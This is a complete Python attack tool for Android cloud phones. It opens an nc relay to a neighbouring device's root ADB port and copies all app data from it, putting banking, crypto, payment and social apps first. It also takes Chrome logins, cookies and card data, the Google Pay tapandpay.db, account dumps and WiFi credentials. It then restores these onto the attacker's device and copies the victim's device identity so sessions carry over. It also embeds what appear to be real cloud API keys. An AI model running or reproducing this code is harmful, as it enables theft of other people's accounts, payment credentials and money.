#!/usr/bin/env python3
"""
Device Cloner v1.0
==================
Clone an entire neighbor device to our VMOS cloud device.
Extracts ALL app data, accounts, sessions, and restores 
with full permission fixing so apps work without re-auth.

Usage:
  python3 scanning/device_cloner.py <TARGET_IP>
  python3 scanning/device_cloner.py 10.0.76.1

Architecture:
  Local → SSH tunnel → ADB bridge (localhost:8550) → nc relay → Target ADB (root)
"""

import asyncio
import subprocess
import os
import sys
import json
import time
import sqlite3
import tarfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
OUR_PAD = "AC32010810392"
RELAY_PORT = 15573
ADB_BRIDGE = "localhost:8550"
CLONE_ROOT = "tmp/device_clones"

# Critical packages to ALWAYS clone (auth/session state lives here)
CRITICAL_PKGS = [
    "com.google.android.gms",        # GMS - accounts, tokens, tapandpay
    "com.android.chrome",            # Chrome - logins, cookies, cards
    "com.android.vending",           # Play Store - account state
]

# High-priority financial/social packages 
HIGH_PRIORITY_RE = [
    "revolut", "paypal", "venmo", "cashapp", "wise", "transferwise",
    "maya", "gcash", "coinbase", "binance", "metamask", "trust",
    "wallet", "bank", "crypto", "pay", "money", "cash",
    "whatsapp", "telegram", "instagram", "facebook", "tiktok",
    "airbnb", "uber", "grab",
]

SYSTEM_SKIP = [
    "com.android.", "android.", "com.google.android.ext.", 
    "com.google.android.networkstack", "com.google.android.cellbroadcast",
    "com.google.android.captiveportallogin", "com.google.android.documentsui",
    "com.google.android.feedback", "com.google.android.gsf",
    "com.google.android.inputmethod", "com.google.android.onetimeinitializer",
    "com.google.android.packageinstaller", "com.google.android.permissioncontroller",
    "com.google.android.printservice", "com.google.android.providers",
    "com.google.android.setupwizard", "com.google.android.tts",
    "com.google.android.webview",
    "com.cloud.", "com.owlproxy.", "com.vmos.",
]

# ═══════════════════════════════════════════════════════════════════════
# ADB HELPERS
# ═══════════════════════════════════════════════════════════════════════

def adb(addr, cmd, timeout=15):
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "shell", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()
    except (subprocess.TimeoutExpired, Exception):
        return ""

def adb_pull(addr, remote, local, timeout=120):
    os.makedirs(os.path.dirname(local) or ".", exist_ok=True)
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "pull", remote, local],
            capture_output=True, text=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False

def adb_push(addr, local, remote, timeout=120):
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "push", local, remote],
            capture_output=True, text=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False

# ═══════════════════════════════════════════════════════════════════════
# RELAY
# ═══════════════════════════════════════════════════════════════════════

async def deploy_relay(client, target_ip, port=RELAY_PORT):
    """Deploy nc relay using Cloud API (root)."""
    await client.sync_cmd(OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /data/local/tmp/rf_{port}; echo c",
        timeout_sec=8)
    await asyncio.sleep(0.4)
    r = await client.sync_cmd(OUR_PAD,
        f"mkfifo /data/local/tmp/rf_{port} && echo fifo_ok", timeout_sec=8)
    d = r.get("data", [])
    if not d or "fifo_ok" not in str(d[0].get("errorMsg", "")):
        return False
    await asyncio.sleep(0.3)
    r = await client.sync_cmd(OUR_PAD,
        f'nohup sh -c "nc -l -p {port} < /data/local/tmp/rf_{port} | '
        f'nc {target_ip} 5555 > /data/local/tmp/rf_{port}" > /dev/null 2>&1 & echo relay_ok',
        timeout_sec=8)
    d = r.get("data", [])
    return bool(d) and "relay_ok" in str(d[0].get("errorMsg", ""))

def connect_relay(port=RELAY_PORT):
    addr = f"localhost:{port}"
    subprocess.run(["adb", "disconnect", addr], capture_output=True, timeout=5)
    subprocess.run(["adb", "-s", ADB_BRIDGE, "forward", f"tcp:{port}", f"tcp:{port}"],
                   capture_output=True, timeout=8)
    subprocess.run(["adb", "connect", addr], capture_output=True, timeout=8)
    return addr

async def kill_relay(client, port=RELAY_PORT):
    await client.sync_cmd(OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; echo d", timeout_sec=5)

# ═══════════════════════════════════════════════════════════════════════
# PACKAGE CLASSIFICATION
# ═══════════════════════════════════════════════════════════════════════

def should_skip(pkg):
    """Return True if pkg is system/infrastructure and should be skipped."""
    return any(pkg.startswith(p) for p in SYSTEM_SKIP)

def is_high_priority(pkg):
    """Return True if pkg matches financial/social app pattern."""
    pkg_lower = pkg.lower()
    return any(kw in pkg_lower for kw in HIGH_PRIORITY_RE)

def classify_packages(pkgs):
    """Sort packages into priority tiers."""
    critical = []
    high = []
    normal = []
    
    for pkg in pkgs:
        if should_skip(pkg):
            continue
        if pkg in CRITICAL_PKGS:
            critical.append(pkg)
        elif is_high_priority(pkg):
            high.append(pkg)
        else:
            normal.append(pkg)
    
    return critical, high, normal

# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: EXTRACT ENTIRE DEVICE
# ═══════════════════════════════════════════════════════════════════════

async def extract_device(client, target_ip):
    """Full device clone extraction."""
    clone_dir = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    os.makedirs(clone_dir, exist_ok=True)
    
    print(f"\n{'═'*70}")
    print(f"  DEVICE CLONER v1.0 — EXTRACTION")
    print(f"  Target: {target_ip}")
    print(f"  Clone dir: {clone_dir}")
    print(f"{'═'*70}")
    
    # Connect to target via relay
    if not await deploy_relay(client, target_ip):
        print("  [!] Relay deploy FAILED")
        return None
    await asyncio.sleep(0.6)
    
    addr = connect_relay()
    await asyncio.sleep(0.5)
    
    test = adb(addr, "echo OK", 5)
    if "OK" not in test:
        print("  [!] ADB not responding")
        return None
    
    whoami = adb(addr, "whoami")
    model = adb(addr, "getprop ro.product.model")
    brand = adb(addr, "getprop ro.product.brand")
    android_ver = adb(addr, "getprop ro.build.version.release")
    shell_id = adb(addr, "id")
    is_root = "uid=0" in shell_id
    
    print(f"  Device: {brand} {model}")
    print(f"  Android: {android_ver}")
    print(f"  Shell: {'ROOT' if is_root else 'SHELL'}")
    
    report = {
        "target_ip": target_ip,
        "brand": brand,
        "model": model,
        "android": android_ver,
        "is_root": is_root,
        "extracted_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "packages": {},
    }
    
    # ── Get all packages ──
    raw = adb(addr, "pm list packages -3 2>/dev/null | cut -d: -f2", 15)
    all_3p = [p.strip() for p in raw.splitlines() if p.strip()]
    print(f"  Third-party packages: {len(all_3p)}")
    
    critical, high, normal = classify_packages(all_3p)
    
    # Always include critical GMS/Chrome
    for pkg in CRITICAL_PKGS:
        if pkg not in critical:
            critical.insert(0, pkg)
    
    # Build extraction order: critical first, then high-priority, then all others
    extract_order = critical + high + normal
    
    print(f"  Extraction order: {len(critical)} critical + {len(high)} high-priority + {len(normal)} normal = {len(extract_order)}")
    print(f"  Critical: {', '.join(critical)}")
    print(f"  High: {', '.join(high[:10])}{'...' if len(high) > 10 else ''}")
    
    # ── Extract each package ──
    total = len(extract_order)
    t0 = time.time()
    
    for idx, pkg in enumerate(extract_order, 1):
        elapsed = time.time() - t0
        rate = elapsed / idx if idx > 1 else 0
        eta = rate * (total - idx)
        
        print(f"\n  [{idx:3d}/{total}] {pkg}", end="", flush=True)
        
        pkg_dir = os.path.join(clone_dir, "apps", pkg)
        os.makedirs(pkg_dir, exist_ok=True)
        pkg_report = {"status": "pending"}
        
        # Check data access
        data_path = f"/data/data/{pkg}"
        ls_test = adb(addr, f"ls {data_path}/ 2>/dev/null | head -1", 5)
        
        if not ls_test:
            print(f" → no data", end="")
            pkg_report["status"] = "no_data"
            report["packages"][pkg] = pkg_report
            continue
        
        # Get APK path
        apk_line = adb(addr, f"pm path {pkg} 2>/dev/null | head -1", 5)
        if apk_line and "package:" in apk_line:
            apk_remote = apk_line.replace("package:", "").strip()
            apk_local = os.path.join(pkg_dir, "base.apk")
            if adb_pull(addr, apk_remote, apk_local, 120):
                sz = os.path.getsize(apk_local) / 1024 / 1024
                print(f" → APK {sz:.1f}M", end="", flush=True)
                pkg_report["apk"] = True
                pkg_report["apk_size_mb"] = round(sz, 1)
            else:
                print(f" → APK fail", end="", flush=True)
                pkg_report["apk"] = False
        
        # Create tar of /data/data/<pkg>
        tar_remote = f"/data/local/tmp/clone_{pkg.replace('.','_')}.tar.gz"
        tar_local = os.path.join(pkg_dir, "data.tar.gz")
        
        tar_result = adb(addr,
            f"cd {data_path} && tar czf {tar_remote} . 2>/dev/null && echo TAR_OK", 90)
        
        if "TAR_OK" in tar_result:
            if adb_pull(addr, tar_remote, tar_local, 180):
                sz = os.path.getsize(tar_local) / 1024
                print(f" data {sz:.0f}K", end="", flush=True)
                pkg_report["data_tar"] = True
                pkg_report["data_size_kb"] = round(sz, 1)
            else:
                print(f" pull-fail", end="", flush=True)
                pkg_report["data_tar"] = False
            adb(addr, f"rm -f {tar_remote}", 5)
        else:
            # Fallback: pull databases + shared_prefs individually
            pulled = 0
            for subdir in ["databases", "shared_prefs", "files"]:
                files = adb(addr, f"ls {data_path}/{subdir}/ 2>/dev/null", 5)
                if not files:
                    continue
                sub_local = os.path.join(pkg_dir, subdir)
                os.makedirs(sub_local, exist_ok=True)
                for f in files.splitlines():
                    f = f.strip()
                    if f and not f.endswith(("-wal", "-shm")):
                        if adb_pull(addr, f"{data_path}/{subdir}/{f}",
                                   os.path.join(sub_local, f), 30):
                            pulled += 1
            print(f" files={pulled}", end="", flush=True)
            pkg_report["individual_files"] = pulled
        
        pkg_report["status"] = "extracted"
        report["packages"][pkg] = pkg_report
        print(f" ✓", end="", flush=True)
    
    # ── Device-level data ──
    print(f"\n\n  ── Device-level extractions ──")
    
    # Accounts dump
    accts = adb(addr, "dumpsys account 2>/dev/null", 20)
    with open(os.path.join(clone_dir, "accounts_dump.txt"), "w") as f:
        f.write(accts)
    
    # Account names for report
    accounts = []
    for line in accts.splitlines():
        if "Account {" in line and "name=" in line:
            try:
                name = line.split("name=")[1].split(",")[0]
                atype = line.split("type=")[1].rstrip("}").strip()
                accounts.append({"name": name, "type": atype})
            except (IndexError, ValueError):
                pass
    report["accounts"] = accounts
    print(f"  Accounts: {len(accounts)}")
    
    # System properties
    props = adb(addr, "getprop", 20)
    with open(os.path.join(clone_dir, "build.prop"), "w") as f:
        f.write(props)
    print(f"  Properties: {len(props.splitlines())} lines")
    
    # WiFi
    wifi = adb(addr, "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null", 10)
    if wifi:
        with open(os.path.join(clone_dir, "WifiConfigStore.xml"), "w") as f:
            f.write(wifi)
    
    # Package list with paths
    pl = adb(addr, "pm list packages -f 2>/dev/null", 15)
    with open(os.path.join(clone_dir, "packages.txt"), "w") as f:
        f.write(pl)
    
    # ── Chrome special extraction ──
    print(f"\n  ── Chrome data ──")
    chrome_dir = os.path.join(clone_dir, "chrome_data")
    os.makedirs(chrome_dir, exist_ok=True)
    for db_name in ["Login Data", "Web Data", "Cookies", "History"]:
        remote = f'/data/data/com.android.chrome/app_chrome/Default/{db_name}'
        local = os.path.join(chrome_dir, db_name.replace(" ", "_") + ".db")
        if adb_pull(addr, remote, local, 30):
            print(f"  {db_name}: ✓")
            if "Login" in db_name:
                try:
                    conn = sqlite3.connect(local)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value FROM logins LIMIT 20")
                    logins = cur.fetchall()
                    report["chrome_logins"] = [{"url": r[0], "user": r[1]} for r in logins]
                    print(f"    Saved logins: {len(logins)}")
                    for l in logins[:5]:
                        print(f"      {l[0]} → {l[1]}")
                    conn.close()
                except Exception as e:
                    print(f"    DB error: {e}")
    
    # ── TapAndPay ──
    tap_local = os.path.join(clone_dir, "tapandpay.db")
    if adb_pull(addr, "/data/data/com.google.android.gms/databases/tapandpay.db", tap_local, 30):
        print(f"  tapandpay.db: ✓")
    
    # ── COIN.xml ──
    coin_local = os.path.join(clone_dir, "COIN.xml")
    coin = adb(addr, "cat /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null", 10)
    if coin:
        with open(coin_local, "w") as f:
            f.write(coin)
        print(f"  COIN.xml: ✓")
    
    # ── Save report ──
    report["status"] = "extracted"
    report_file = os.path.join(clone_dir, "clone_report.json")
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2, default=str)
    
    # ── Stats ──
    extracted = sum(1 for p in report["packages"].values() if p["status"] == "extracted")
    total_apk = sum(p.get("apk_size_mb", 0) for p in report["packages"].values())
    total_data = sum(p.get("data_size_kb", 0) for p in report["packages"].values()) / 1024
    
    print(f"\n{'═'*70}")
    print(f"  EXTRACTION COMPLETE")
    print(f"  Packages extracted: {extracted}/{total}")
    print(f"  Total APK: {total_apk:.1f} MB")
    print(f"  Total data: {total_data:.1f} MB")
    print(f"  Accounts: {len(accounts)}")
    print(f"  Clone dir: {clone_dir}")
    print(f"  Report: {report_file}")
    print(f"{'═'*70}")
    
    subprocess.run(["adb", "disconnect", f"localhost:{RELAY_PORT}"], capture_output=True, timeout=5)
    await kill_relay(client)
    
    return report

# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: RESTORE TO OUR DEVICE
# ═══════════════════════════════════════════════════════════════════════

async def restore_device(client, target_ip):
    """Restore cloned device data to our device."""
    clone_dir = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    report_file = os.path.join(clone_dir, "clone_report.json")
    
    if not os.path.exists(report_file):
        print(f"[!] No clone report at {report_file}")
        print(f"    Run extraction first: python3 scanning/device_cloner.py {target_ip}")
        return
    
    with open(report_file) as f:
        report = json.load(f)
    
    print(f"\n{'═'*70}")
    print(f"  DEVICE CLONER v1.0 — RESTORE TO {OUR_PAD}")
    print(f"  Source: {target_ip} ({report.get('brand','')} {report.get('model','')})")
    print(f"  Packages: {len(report.get('packages', {}))}")
    print(f"{'═'*70}")
    
    our_dev = ADB_BRIDGE
    test = adb(our_dev, "echo READY", 5)
    if "READY" not in test:
        print("[!] Cannot connect to our device")
        return
    
    our_id = adb(our_dev, "id", 5)
    is_root = "uid=0" in our_id
    print(f"  Our shell: {our_id}")
    
    if not is_root:
        print("  Enabling root via API...")
        try:
            await client.switch_root([OUR_PAD], enable=True, root_type=0)
            await asyncio.sleep(3)
            our_id = adb(our_dev, "id", 5)
            is_root = "uid=0" in our_id
        except Exception as e:
            print(f"  Root enable error: {e}")
    
    print(f"  Root: {'YES' if is_root else 'NO'}")
    
    restore_log = {
        "source": target_ip,
        "target": OUR_PAD,
        "started": time.strftime("%Y-%m-%d %H:%M:%S"),
        "apps": {},
    }
    
    apps_dir = os.path.join(clone_dir, "apps")
    if not os.path.exists(apps_dir):
        print("[!] No apps directory in clone")
        return
    
    # Get ordered list from report
    pkgs = list(report.get("packages", {}).keys())
    total = len(pkgs)
    t0 = time.time()
    
    for idx, pkg in enumerate(pkgs, 1):
        pkg_info = report["packages"][pkg]
        if pkg_info.get("status") != "extracted":
            continue
        
        pkg_dir = os.path.join(apps_dir, pkg)
        if not os.path.exists(pkg_dir):
            continue
        
        elapsed = time.time() - t0
        rate = elapsed / idx if idx > 1 else 0
        eta = rate * (total - idx)
        
        print(f"\n  [{idx:3d}/{total}] {pkg} (eta {eta:.0f}s)")
        app_log = {"status": "pending"}
        
        # 1. Install APK
        apk_path = os.path.join(pkg_dir, "base.apk")
        if os.path.exists(apk_path):
            # Check if already installed
            existing = adb(our_dev, f"pm path {pkg} 2>/dev/null", 5)
            if existing:
                print(f"    Already installed, skipping APK")
                app_log["install"] = "existing"
            else:
                sz = os.path.getsize(apk_path) / 1024 / 1024
                print(f"    Installing APK ({sz:.1f}M)...")
                remote_apk = f"/data/local/tmp/clone_{pkg.replace('.','_')}.apk"
                if adb_push(our_dev, apk_path, remote_apk, 180):
                    result = adb(our_dev, f"pm install -r -g -d {remote_apk} 2>&1", 60)
                    print(f"    Install: {result[:120]}")
                    app_log["install"] = "Success" in result
                    adb(our_dev, f"rm -f {remote_apk}", 5)
                else:
                    print(f"    APK push failed")
                    app_log["install"] = False
        else:
            existing = adb(our_dev, f"pm path {pkg} 2>/dev/null", 5)
            if not existing:
                print(f"    No APK and not installed, skipping data")
                app_log["status"] = "skipped_no_apk"
                restore_log["apps"][pkg] = app_log
                continue
        
        # 2. Force-stop
        adb(our_dev, f"am force-stop {pkg}", 5)
        await asyncio.sleep(0.3)
        
        # 3. Restore data
        data_tar = os.path.join(pkg_dir, "data.tar.gz")
        data_path = f"/data/data/{pkg}"
        
        if os.path.exists(data_tar):
            print(f"    Restoring data tar...")
            remote_tar = f"/data/local/tmp/clone_data_{pkg.replace('.','_')}.tar.gz"
            if adb_push(our_dev, data_tar, remote_tar, 180):
                # Ensure directory exists
                adb(our_dev, f"mkdir -p {data_path}", 5)
                result = adb(our_dev,
                    f"cd {data_path} && tar xzf {remote_tar} 2>&1 && echo EXTRACT_OK", 60)
                ok = "EXTRACT_OK" in result
                print(f"    Extract: {'OK' if ok else 'FAIL'}")
                app_log["data_restore"] = ok
                adb(our_dev, f"rm -f {remote_tar}", 5)
            else:
                print(f"    Data push failed")
                app_log["data_restore"] = False
        else:
            # Push individual directories
            pushed = 0
            for subdir in ["databases", "shared_prefs", "files"]:
                sub_local = os.path.join(pkg_dir, subdir)
                if not os.path.exists(sub_local):
                    continue
                remote_sub = f"{data_path}/{subdir}"
                adb(our_dev, f"mkdir -p {remote_sub}", 5)
                for fname in os.listdir(sub_local):
                    fpath = os.path.join(sub_local, fname)
                    if os.path.isfile(fpath):
                        if adb_push(our_dev, fpath, f"{remote_sub}/{fname}", 30):
                            pushed += 1
            print(f"    Pushed {pushed} individual files")
            app_log["data_restore"] = pushed > 0
        
        # 4. Fix permissions
        if is_root:
            # Get UID for package
            uid = ""
            uid_raw = adb(our_dev, f"stat -c '%u' {data_path} 2>/dev/null", 5)
            if uid_raw and uid_raw.isdigit():
                uid = uid_raw
            else:
                uid_dump = adb(our_dev,
                    f"dumpsys package {pkg} 2>/dev/null | grep 'userId=' | head -1", 8)
                if "userId=" in uid_dump:
                    try:
                        uid = uid_dump.split("userId=")[1].split()[0].strip()
                    except (IndexError, ValueError):
                        pass
            
            if uid:
                adb(our_dev, f"chown -R {uid}:{uid} {data_path}/", 10)
                adb(our_dev, f"chmod -R 770 {data_path}/", 5)
                # Fix specific subdirectory permissions
                adb(our_dev, f"chmod 771 {data_path}", 5)
                for sub in ["databases", "shared_prefs", "files", "cache", "code_cache"]:
                    adb(our_dev, f"chmod 771 {data_path}/{sub} 2>/dev/null", 3)
                adb(our_dev, f"restorecon -R {data_path}/ 2>/dev/null", 5)
                print(f"    Permissions fixed (uid={uid})")
                app_log["permissions"] = True
            else:
                print(f"    Could not determine UID")
                app_log["permissions"] = False
        
        app_log["status"] = "restored"
        restore_log["apps"][pkg] = app_log
    
    # ── Restore Chrome data ──
    chrome_dir = os.path.join(clone_dir, "chrome_data")
    if os.path.exists(chrome_dir):
        print(f"\n  ── Restoring Chrome data ──")
        adb(our_dev, "am force-stop com.android.chrome", 5)
        await asyncio.sleep(0.5)
        chrome_default = "/data/data/com.android.chrome/app_chrome/Default"
        adb(our_dev, f"mkdir -p {chrome_default}", 5)
        for db_file in os.listdir(chrome_dir):
            fpath = os.path.join(chrome_dir, db_file)
            if os.path.isfile(fpath):
                remote_name = db_file.replace("_", " ").replace(".db", "")
                if adb_push(our_dev, fpath, f"{chrome_default}/{remote_name}", 30):
                    print(f"    {remote_name}: ✓")
        if is_root:
            chrome_uid = adb(our_dev, "stat -c '%u' /data/data/com.android.chrome 2>/dev/null", 5)
            if chrome_uid and chrome_uid.isdigit():
                adb(our_dev, f"chown -R {chrome_uid}:{chrome_uid} {chrome_default}/", 10)
    
    # ── Restore tapandpay ──
    tap_file = os.path.join(clone_dir, "tapandpay.db")
    if os.path.exists(tap_file):
        print(f"\n  ── Restoring tapandpay.db ──")
        remote = "/data/data/com.google.android.gms/databases/tapandpay.db"
        if adb_push(our_dev, tap_file, remote, 30):
            if is_root:
                gms_uid = adb(our_dev, "stat -c '%u' /data/data/com.google.android.gms 2>/dev/null", 5)
                if gms_uid and gms_uid.isdigit():
                    adb(our_dev, f"chown {gms_uid}:{gms_uid} {remote}", 5)
            print(f"    tapandpay.db: ✓")
    
    # ── Restore COIN.xml ──
    coin_file = os.path.join(clone_dir, "COIN.xml")
    if os.path.exists(coin_file):
        remote = "/data/data/com.google.android.gms/shared_prefs/COIN.xml"
        if adb_push(our_dev, coin_file, remote, 10):
            print(f"    COIN.xml: ✓")
    
    # ── Copy device properties to match source identity ──
    props_file = os.path.join(clone_dir, "build.prop")
    if os.path.exists(props_file):
        print(f"\n  ── Cloning device identity ──")
        with open(props_file) as f:
            props_raw = f.read()
        
        # Extract key identity properties to clone
        identity_keys = [
            "ro.product.brand", "ro.product.model", "ro.product.device",
            "ro.product.name", "ro.product.manufacturer",
            "ro.build.display.id", "ro.build.version.release",
            "ro.build.version.sdk", "ro.build.fingerprint",
            "ro.product.board", "ro.hardware",
            "ro.serialno", "ro.boot.serialno",
        ]
        
        props_dict = {}
        for line in props_raw.splitlines():
            line = line.strip()
            if line.startswith("[") and "]: [" in line:
                key = line.split("]: [")[0].lstrip("[")
                val = line.split("]: [")[1].rstrip("]")
                if key in identity_keys and val:
                    props_dict[key] = val
        
        if props_dict:
            try:
                await client.update_pad_properties(OUR_PAD, props_dict)
                print(f"    Cloned {len(props_dict)} identity properties")
                for k, v in list(props_dict.items())[:5]:
                    print(f"      {k} = {v}")
            except Exception as e:
                print(f"    Property update error: {e}")
    
    # ── Summary ──
    restored = sum(1 for a in restore_log["apps"].values() if a.get("status") == "restored")
    restore_log["status"] = "complete"
    restore_log["completed"] = time.strftime("%Y-%m-%d %H:%M:%S")
    
    log_file = os.path.join(clone_dir, "restore_log.json")
    with open(log_file, "w") as f:
        json.dump(restore_log, f, indent=2)
    
    print(f"\n{'═'*70}")
    print(f"  RESTORE COMPLETE")
    print(f"  Apps restored: {restored}/{total}")
    print(f"  Log: {log_file}")
    print(f"{'═'*70}")
    print(f"\n  Next: Open Revolut/apps on device — sessions should persist.")
    print(f"  If auth challenge appears, the app re-checks device fingerprint.")

# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python3 scanning/device_cloner.py <TARGET_IP>           # Extract + Restore")
        print("  python3 scanning/device_cloner.py extract <TARGET_IP>   # Extract only")
        print("  python3 scanning/device_cloner.py restore <TARGET_IP>   # Restore only")
        sys.exit(1)
    
    client = VMOSCloudClient(ak=AK, sk=SK, base_url="https://api.vmoscloud.com")
    
    if sys.argv[1] == "extract":
        target = sys.argv[2]
        await extract_device(client, target)
    elif sys.argv[1] == "restore":
        target = sys.argv[2]
        await restore_device(client, target)
    else:
        target = sys.argv[1]
        report = await extract_device(client, target)
        if report and report.get("status") == "extracted":
            print(f"\n  Extraction complete. Starting restore...")
            await asyncio.sleep(2)
            await restore_device(client, target)

if __name__ == "__main__":
    asyncio.run(main())
